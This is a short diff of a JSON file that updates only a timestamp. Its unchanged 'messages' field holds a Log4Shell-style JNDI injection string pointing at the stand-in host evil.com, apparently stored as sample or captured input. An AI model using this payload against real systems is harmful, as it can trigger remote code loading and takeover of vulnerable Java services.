@@ -2,5 +2,5 @@
   "messages": [
     "${jndi:ldap://evil.com/a}"
   ],
-  "updated_at": "2026-01-12T02:42:24.919486"
+  "updated_at": "2026-01-12T03:10:48.994268"
 }
